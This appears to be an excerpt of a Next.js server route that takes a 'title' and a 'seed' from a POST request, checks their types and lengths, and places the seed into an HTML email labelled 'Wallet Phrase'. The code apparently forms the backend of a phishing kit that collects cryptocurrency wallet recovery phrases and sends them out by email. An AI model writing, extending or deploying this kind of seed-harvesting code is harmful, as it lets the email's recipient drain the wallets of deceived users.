...
export async function POST(request) {
  ...
  const { title, seed } = body || {};
  if (!title || !seed) {
    return NextResponse.json({ msg: 'Missing title or seed' }, { status: 400 });
  }
  if (typeof title !== 'string' || typeof seed !== 'string') {
    return NextResponse.json({ msg: 'Invalid input types' }, { status: 400 });
  }
  if (title.length > 120 || seed.length > 5000) {
  ...
  const mailContent = `
    ...
    <p><strong>Wallet Phrase:</strong><br><pre><code>${safeSeed}</code></pre></p>
  `;
